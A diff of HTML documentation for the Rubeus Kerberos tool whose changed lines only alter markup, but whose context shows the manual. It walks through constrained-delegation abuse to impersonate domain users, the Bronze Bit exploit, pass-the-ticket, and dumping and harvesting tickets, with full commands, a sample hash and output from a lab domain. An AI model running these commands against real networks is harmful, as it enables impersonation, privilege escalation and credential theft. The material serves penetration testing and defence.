1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> or Elad Shamir&#x27;s <a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" class="outbound" target="_blank"><span>&quot;Wagging the Dog&quot;</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> post.</p>
 <p>A <strong>TL;DR</strong> explanation is that an account with constrained delegation enabled is allowed to request tickets <em>to itself</em> as any user, in a process known as S4U2self. In order for an account to be allowed to do this, it has to have <strong>TrustedToAuthForDelegation</strong> enabled in it&#x27;s useraccountcontrol property, something that only elevated users can modify by default. This ticket has the <strong>FORWARDABLE</strong> flag set by default. The service can then use this specially requested ticket to request a service ticket to any service principal name (SPN) specified in the account&#x27;s <strong>msds-allowedtodelegateto</strong> field. So long story short, if you have control of an account with <strong>TrustedToAuthForDelegation</strong> set and a value in <strong>msds-allowedtodelegateto</strong>, you can pretend to be any user in the domain to the SPNs set in the account&#x27;s <strong>msds-allowedtodelegateto</strong> field.</p>
 <p>This &quot;control&quot; can be the hash of the account (<code v-pre>/rc4</code> or <code v-pre>/aes256</code>), or an existing TGT (<code v-pre>/ticket:X</code>) for the account with a <strong>msds-allowedtodelegateto</strong> value set. If a <code v-pre>/user</code> and rc4/aes256 hash is supplied, the <strong>s4u</strong> module performs an <doc-anchor-trigger to="#asktgt">asktgt</doc-anchor-trigger> action first, using the returned ticket for the steps following. If a TGT <code v-pre>/ticket:X</code> is supplied, that TGT is used instead.</p>
 <p>A <code v-pre>/impersonateuser:X</code> parameter <strong>MUST</strong> be supplied to the <strong>s4u</strong> module. If nothing else is supplied, just the S4U2self process is executed, returning a forwardable ticket:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a
 
  ______        _
 (_____ \      | |
@@ -1007,7 +1008,7 @@ v1.3.3
 </doc-codeblock></div>
 <p>That forwardable ticket can then be used as a <code v-pre>/tgs:Y</code> parameter (base64 blob or .kirbi file) to execute the S4U2proxy process. A valid <strong>msds-allowedtodelegateto</strong> value for the account must be supplied (<code v-pre>/msdsspn:X</code>). Say the <strong><a href="mailto:patsy@testlab.local">patsy@testlab.local</a></strong> account looks like this:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">PS C:\&gt; Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
+<pre translate="no" class="language-none"><code v-pre class="language-none">PS C:\&gt; Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
 ldap/PRIMARY.testlab.local/testlab.local
 ldap/PRIMARY
 ldap/PRIMARY.testlab.local/TESTLAB
@@ -1018,7 +1019,7 @@ ldap/PRIMARY.testlab.local</code></pre>
 </doc-codeblock></div>
 <p>Then the S4U2proxy abuse function (using the ticket from the previous S4U2self process) would be:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWoo..(snip).. /msdsspn:&quot;ldap/PRIMARY.testlab.local&quot; /tgs:doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWoo..(snip).. /msdsspn:&quot;ldap/PRIMARY.testlab.local&quot; /tgs:doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..
  ______        _
 (_____ \      | |
  _____) )_   _| |__  _____ _   _  ___
@@ -1044,10 +1045,10 @@ v1.3.3
     doIGujCCBragAwIBBaEDAgEWoo..(snip)..</code></pre>
 </doc-codeblock></div>
 <p>Where <code v-pre>/ticket:X</code> is the TGT returned in the first step, and <code v-pre>/tgs</code> is the S4U2self ticket. Injecting the resulting ticket (manually with <doc-anchor-trigger to="#ptt">Rubeus.exe ptt /ticket:X</doc-anchor-trigger> or by supplying the <code v-pre>/ptt</code> flag to the <strong>s4u</strong> command) will allow you access the <strong>ldap</strong> service on primary.testlab.local <em>as if you are dfm.a</em>.</p>
-<p>The <code v-pre>/altservice</code> parameter takes advantage of <a href="https://twitter.com/agsolino" class="outbound" target="_blank"><span>Alberto Solino</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s great discovery about <a href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more" class="outbound" target="_blank"><span>how the service name (sname) is not protected in the KRB-CRED file</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (<code v-pre>/altservice:cifs,HOST,...</code>).</p>
+<p>The <code v-pre>/altservice</code> parameter takes advantage of <a href="https://twitter.com/agsolino" class="outbound" target="_blank"><span>Alberto Solino</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s great discovery about <a href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more" class="outbound" target="_blank"><span>how the service name (sname) is not protected in the KRB-CRED file</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, only the server name is. This allows us to substitute in any service name we want in the resulting KRB-CRED (.kirbi) file. One or more alternate service names can be supplied, comma separated (<code v-pre>/altservice:cifs,HOST,...</code>).</p>
 <p>Let&#x27;s expand on the previous example, forging access to the filesystem on <strong>primary.testlab.local</strong> by abusing its constrained delegation configuration and the alternate service substitution. Let&#x27;s package it all into one step as well, performing a TGT request, S4U2self process, S4U2proxy execution, and injection of the final ticket:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;dir \\primary.testlab.local\C$
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;dir \\primary.testlab.local\C$
 Access is denied.
 
 C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a /msdsspn:&quot;ldap/PRIMARY.testlab.local&quot; /altservice:cifs /ptt
@@ -1126,10 +1127,10 @@ Directory of \\primary.testlab.local\C$
 </doc-codeblock></div>
 <p>By default, several differences exists between the S4U2Self and S4U2Proxy TGS-REQ&#x27;s generated by Rubeus and genuine requests. To form the TGS-REQ&#x27;s more inline with genuine requests, the <code v-pre>/opsec</code> flag can be used. As this flag is intended to make Rubeus traffic more stealthy, it cannot by default be used with any encryption type other than <code v-pre>aes256</code> and will just throw a warning and exit if another encryption type is used. To allow for other encryption types to be used with the <code v-pre>/opsec</code> changes, the <code v-pre>/force</code> flag exists. The <code v-pre>/opsec</code> flag has not yet been implemented for cross domain S4U.</p>
 <p>The <em>Bronze Bit</em> exploit (CVE-2020-17049) is implemented using the <code v-pre>/bronzebit</code> flag. Adding this flag will automatically flip the <em>forwardable</em> flag when retreiving the S4U2Self ticket. As flipping this flag requires the service ticket to be decrypted and reencrypted, the long term key (service account&#x27;s password hash) is required. For this reason, if a TGT is being supplied, the service accounts credentials are also required for this to work.</p>
-<p>It is possible, in certain cirsumstances, to use an S4U2Self ticket to impersonate protected users in order to escalate privileges on the requesting system, as discussed <a href="https://exploit.ph/revisiting-delegate-2-thyself.html" class="outbound" target="_blank"><span>here</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>. For this purpose, the <code v-pre>/self</code> flag and <code v-pre>/altservice:X</code> argument can be used to generate a usable service ticket.</p>
+<p>It is possible, in certain cirsumstances, to use an S4U2Self ticket to impersonate protected users in order to escalate privileges on the requesting system, as discussed <a href="https://exploit.ph/revisiting-delegate-2-thyself.html" class="outbound" target="_blank"><span>here</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>. For this purpose, the <code v-pre>/self</code> flag and <code v-pre>/altservice:X</code> argument can be used to generate a usable service ticket.</p>
 <p>To forge an S4U2Self referral, only the trust key is required. By using the <code v-pre>/targetdomain:X</code> argument with the <code v-pre>/self</code> flag and without the <code v-pre>/targetdc</code> argument, Rubeus will treat the ticket supplied with <code v-pre>/ticket:X</code> as an S4U2Self referral and only request the final S4U2Self service ticket. The <code v-pre>/altservice:X</code> can also be used to rewrite the sname in the resulting ticket:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /self /targetdomain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /impersonateuser:external.admin /domain:external.zeroday.lab /altservice:host/isql1.internal.zeroday.lab /nowrap /ticket:C:\temp\s4u2self-referral.kirbi
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe s4u /self /targetdomain:internal.zeroday.lab /dc:idc1.internal.zeroday.lab /impersonateuser:external.admin /domain:external.zeroday.lab /altservice:host/isql1.internal.zeroday.lab /nowrap /ticket:C:\temp\s4u2self-referral.kirbi
 
    ______        _
   (_____ \      | |
@@ -1192,7 +1193,7 @@ Directory of \\primary.testlab.local\C$
 </doc-anchor-target>
 <p>The <strong>ptt</strong> action will submit a <code v-pre>/ticket:X</code> (TGT or service ticket) for the current logon session through the LsaCallAuthenticationPackage() API with a KERB_SUBMIT_TKT_REQUEST message, or (<strong>if elevated</strong>) to the logon session specified by <code v-pre>/luid:0xA..</code>. Like other <code v-pre>/ticket:X</code> parameters, the value can be a base64 encoding of a .kirbi file or the path to a .kirbi file on disk.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
 
  ______        _
 (_____ \      | |
@@ -1230,7 +1231,7 @@ v1.3.3
 </doc-codeblock></div>
 <p><strong>Elevated</strong> ticket application to another logon session:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist /luid:0x474722b
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist /luid:0x474722b
 
  ______        _
 (_____ \      | |
@@ -1323,7 +1324,7 @@ UserPrincipalName        : patsy@testlab.local
 </doc-anchor-target>
 <p>The <strong>purge</strong> action will purge all Kerberos tickets from the current logon session, or (if elevated) to the logon session specified by <code v-pre>/luid:0xA..</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist
 
  ______        _
 (_____ \      | |
@@ -1393,7 +1394,7 @@ C:\Rubeus&gt;</code></pre>
 </doc-codeblock></div>
 <p><strong>Elevated</strong> purging of another logon session:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage /luid:0x474722b
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage /luid:0x474722b
 
  ______        _
 (_____ \      | |
@@ -1466,7 +1467,7 @@ v1.3.3
 <p>If the supplied ticket is a service ticket AND the encryption type is RC4_HMAC, an extracted Kerberoast-compatible hash is output. If the ticket is a service ticket but the encryption key is AES128/AES256, a warning is displayed. If the ticket is a TGT, no hash or warning is displayed.</p>
 <p>Display information about a TGT:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe describe /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
 
  ______        _
 (_____ \      | |
@@ -1493,7 +1494,7 @@ Base64(key)           :  e3MxrlTu9jHh9hG43UfiAQ==</code></pre>
 </doc-codeblock></div>
 <p>Display information about service ticket with an extracted Kerberoast hash:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe describe /ticket:service_ticket.kirbi
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe describe /ticket:service_ticket.kirbi
 
  ______        _
 (_____ \      | |
@@ -1573,7 +1574,7 @@ Kerberoast Hash       :  $krb5tgs$23$*USER$DOMAIN$asdf/asdfasdf*$DEB467BF9C9023E
 <p>If elevated, tickets can be filtered for a specific LogonID with <code v-pre>/luid:0xA..</code> or a specific user with <code v-pre>/user:USER</code>. This can be useful when triaging systems with a lot of Kerberos tickets.</p>
 <p>Triage all enumerateable tickets (non-elevated):</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage
 
  ______        _
 (_____ \      | |
@@ -1600,7 +1601,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>Triage all enumerateable tickets (elevated):</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage
 
  ______        _
 (_____ \      | |
@@ -1642,7 +1643,7 @@ v1.3.4
 </doc-codeblock></div>
 <p>Triage targeting a specific service (elevated):</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage /service:ldap
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe triage /service:ldap
 
  ______        _
 (_____ \      | |
@@ -1676,7 +1677,7 @@ v1.3.4
 <p>The <strong>klist</strong> will list detailed information on the current user&#x27;s logon session and Kerberos tickets, if not elevated. If run from an elevated context, information on all logon sessions and associated Kerberos tickets is displayed. Logon and ticket information can be displayed for a specific LogonID with <code v-pre>/luid:0xA..</code> (if elevated).</p>
 <p>Listing the current (non-elevated) user&#x27;s logon session and Kerberos ticket information:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist
 
  ______        _
 (_____ \      | |
@@ -1703,7 +1704,7 @@ v1.3.4
 </doc-codeblock></div>
 <p><strong>Elevated</strong> listing of another user&#x27;s logon session/Kerberos ticket information:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist /luid:0x47869b4
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe klist /luid:0x47869b4
 
  ______        _
 (_____ \      | |
@@ -1749,7 +1750,7 @@ UserPrincipalName        : harmj0y@testlab.local
 <p><strong>Note:</strong> if run from a <em>non-elevated</em> context, the session keys for TGTs are not returned (by default) from the associated APIs, so only service tickets extracted will be usable. If you want to (somewhat) workaround this, use the <strong>tgtdeleg</strong> command.</p>
 <p>Extracting the current user&#x27;s usable service tickets:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe dump
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe dump
 
  ______        _
 (_____ \      | |
@@ -1796,7 +1797,7 @@ Base64EncodedTicket      :
 </doc-codeblock></div>
 <p><strong>Elevated</strong> extraction of tickets from a specific logon session:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe dump /luid:0x47869cc
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe dump /luid:0x47869cc
 
  ______        _
 (_____ \      | |
@@ -1872,7 +1873,7 @@ UserPrincipalName        : harmj0y@testlab.local
 </doc-codeblock></div>
 <p><strong>Elevated</strong> extraction of all TGTs on a system:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe dump /service:krbtgt
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe dump /service:krbtgt
 
  ______        _
 (_____ \      | |
@@ -1968,10 +1969,10 @@ UserPrincipalName        : WINDOWS10$@testlab.local
         <span>tgtdeleg</span>
     </h3>
 </doc-anchor-target>
-<p>The <strong>tgtdeleg</strong> using <a href="https://twitter.com/gentilkiwi" class="outbound" target="_blank"><span>@gentilkiwi</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> trick (<strong>tgt::deleg</strong>) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user&#x27;s Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.</p>
+<p>The <strong>tgtdeleg</strong> using <a href="https://twitter.com/gentilkiwi" class="outbound" target="_blank"><span>@gentilkiwi</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>&#x27;s <a href="https://github.com/gentilkiwi/kekeo/" class="outbound" target="_blank"><span>Kekeo</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a> trick (<strong>tgt::deleg</strong>) that abuses the Kerberos GSS-API to retrieve a usable TGT for the current user without needing elevation on the host. AcquireCredentialsHandle() is used to get a handle to the current user&#x27;s Kerberos security credentials, and InitializeSecurityContext() with the ISC_REQ_DELEGATE flag and a target SPN of HOST/DC.domain.com to prepare a fake delegate context to send to the DC. This results in an AP-REQ in the GSS-API output that contains a KRB_CRED in the authenticator checksum. The service ticket session key is extracted from the local Kerberos cache and is used to decrypt the KRB_CRED in the authenticator, resulting in a usable TGT .kirbi.</p>
 <p>If automatic target/domain extraction is failing, a known SPN of a service configured with unconstrained delegation can be specified with <code v-pre>/target:SPN</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe tgtdeleg
+<pre translate="no" class="language-none"><code v-pre class="language-none">C:\Rubeus&gt;Rubeus.exe tgtdeleg
 
  ______        _
 (_____ \      | |
@@ -2009,7 +2010,7 @@ v1.3.3
 <p>If you want <strong>monitor</strong> to run for a specific period of time, use <code v-pre>/runfor:SECONDS</code>.</p>
 <p>Further, if you wish to save the output to the registry, pass the <code v-pre>/registry</code> flag and specfiy a path under HKLM to create (e.g., <code v-pre>/registry:SOFTWARE\MONITOR</code>). Then you can remove this entry after you&#x27;ve finished running Rubeus by <code v-pre>Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">c:\Rubeus&gt;Rubeus.exe monitor /targetuser:DC$ /interval:10
+<pre translate="no" class="language-none"><code v-pre class="language-none">c:\Rubeus&gt;Rubeus.exe monitor /targetuser:DC$ /interval:10
 
    ______        _
   (_____ \      | |
@@ -2051,7 +2052,7 @@ v1.3.3
 <p>If you want <strong>harvest</strong> to run for a specific period of time, use <code v-pre>/runfor:SECONDS</code>.</p>
 <p>Further, if you wish to save the output to the registry, pass the <code v-pre>/registry</code> flag and specfiy a path under HKLM to create (e.g., <code v-pre>/registry:SOFTWARE\MONITOR</code>). Then you can remove this entry after you&#x27;ve finished running Rubeus by <code v-pre>Get-Item HKLM:\SOFTWARE\MONITOR\ | Remove-Item -Recurse -Force</code>.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre class="language-none"><code v-pre class="language-none">c:\Rubeus&gt;Rubeus.exe harvest /interval:30
+<pre translate="no" class="language-none"><code v-pre class="language-none">c:\Rubeus&gt;Rubeus.exe harvest /interval:30
 
    ______        _
   (_____ \      | |
@@ -2118,7 +2119,7 @@ Base64EncodedTicket   :
         <span>kerberoast</span>
     </h3>
 </doc-anchor-target>
